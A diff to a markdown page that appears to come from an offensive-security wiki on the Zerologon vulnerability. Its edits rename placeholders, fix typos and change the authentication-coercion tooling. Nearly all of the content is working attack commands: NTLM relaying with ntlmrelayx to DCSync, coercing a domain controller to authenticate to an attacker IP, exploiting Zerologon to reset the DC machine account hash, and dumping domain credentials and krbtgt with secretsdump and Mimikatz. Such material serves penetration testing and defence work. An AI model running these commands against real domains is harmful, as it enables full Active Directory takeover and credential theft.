@@ -31,13 +31,13 @@ Another technique, [showcased by Dirk-jan](https://dirkjanm.io/a-different-way-o
 In order to operate the attack, the [Impacket](https://github.com/SecureAuthCorp/impacket)'s script [ntlmrelayx](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) (Python) can be used.
 
 ```bash
-ntlmrelayx -t dcsync://$domain_controller_2 -smb2support
+ntlmrelayx -t dcsync://$DC_HOST_2 -smb2support
 ```
 
-Once the relay servers are up and running and waiting for incoming trafic, attackers need to coerce a Domain Controller's authentication (or from another account with enough privileges). One way of doing this is to rely on the [PrinterBug](../mitm-and-coerced-authentications/ms-rprn.md).
+Once the relay servers are up and running and waiting for incoming traffic, attackers need to coerce a Domain Controller's authentication (or from another account with enough privileges). Any [RPC coercion technique](../mitm-and-coerced-authentications/rpc-coercions/ms-rprn.md) can be used for this purpose (e.g. [MS-RPRN](../mitm-and-coerced-authentications/rpc-coercions/ms-rprn.md), [MS-EFSR](../mitm-and-coerced-authentications/rpc-coercions/ms-efsr.md), [MS-DFSNM](../mitm-and-coerced-authentications/rpc-coercions/ms-dfsnm.md), [MS-FSRVP](../mitm-and-coerced-authentications/rpc-coercions/ms-fsrvp.md)).
 
 ```bash
-dementor.py -d $domain -u $user -p $password $attacker_ip $domain_controller_1
+coercer coerce -t $DC_HOST_1 -l $ATTACKER_IP -u "$USER" -p "$PASSWORD" -d "$DOMAIN"
 ```
 
 ### Password change ( :warning: disruptive)
@@ -59,19 +59,19 @@ The original attack path can be conducted from UNIX-like systems with the follow
 
 ```bash
 # Scan for the vulnerability
-zerologon-scan 'DC_name' 'DC_IP_address'
+zerologon-scan "$DC_NAME" $DC_IP
 
 # Exploit the vulnerability: set the NT hash to \x00*8
-zerologon-exploit 'DC_name' 'DC_IP_address'
+zerologon-exploit "$DC_NAME" $DC_IP
 
 # Obtain the Domain Admin's NT hash
-secretsdump -no-pass 'Domain'/'DC_computer_account$'@'Domain_controller'
+secretsdump -no-pass "$DOMAIN/$DC_ACCOUNT\$@$DC_HOST"
 
 # Obtain the machine account hex encoded password with the domain admin credentials
-secretsdump -hashes :'NThash' 'Domain'/'Domain_admin'@'Domain_controller'
+secretsdump -hashes :"$NT_HASH" "$DOMAIN/$USER@$DC_HOST"
 
 # Restore the machine account password
-zerologon-restore 'Domain'/'DC_account'@'Domain_controller' -target-ip 'DC_IP_address' -hexpass 'DC_hexpass'
+zerologon-restore "$DOMAIN/$DC_ACCOUNT@$DC_HOST" -target-ip $DC_IP -hexpass "$DC_HEXPASS"
 ```
 
 
@@ -81,22 +81,22 @@ The attack can also be conducted from Windows systems with [Mimikatz](https://gi
 
 ```powershell
 # Scan for the vulnerability
-lsadump::zerologon /target:'Domain_controller' /account:'DC_account$'
+lsadump::zerologon /target:"$DC_HOST" /account:"$DC_ACCOUNT$"
 
 # Exploit the vulnerability: set the NT hash to \x00*8
-lsadump::zerologon /exploit /target:'Domain_controller' /account:'DC_account$'
+lsadump::zerologon /exploit /target:"$DC_HOST" /account:"$DC_ACCOUNT$"
 
 # Obtain the krbtgt by DCSync
-lsadump::dcsync /domain:'Domain' /dc:'Domain_controller' /user:'Administrator' /authuser:'DC_account$' /authdomain:'Domain' /authpassword:'' /authntlm
+lsadump::dcsync /domain:"$DOMAIN" /dc:"$DC_HOST" /user:'Administrator' /authuser:"$DC_ACCOUNT$" /authdomain:"$DOMAIN" /authpassword:'' /authntlm
 
 # Reset the DC account's password in AD and in its SAM base
-lsadump::postzerologon /target:'Domain_Controller' /account:'DC_account$'
+lsadump::postzerologon /target:"$DC_HOST" /account:"$DC_ACCOUNT$"
 
-# (alternative to postezerologon) Find the previous NT hash
+# (alternative to postzerologon) Find the previous NT hash
 //TODO
 
-# (alternative to postezerologon) Change the NT hash of the domain controller machine account in the AD back to its original value
-lsadump::changentlm /server:'Domain_controller' /user:'DC_account$' /oldntlm:'31d6cfe0d16ae931b73c59d7e0c089c0' /newntlm:'previous_NThash'
+# (alternative to postzerologon) Change the NT hash of the domain controller machine account in the AD back to its original value
+lsadump::changentlm /server:"$DC_HOST" /user:"$DC_ACCOUNT$" /oldntlm:'31d6cfe0d16ae931b73c59d7e0c089c0' /newntlm:"$NT_HASH"
 ```
 
 :::
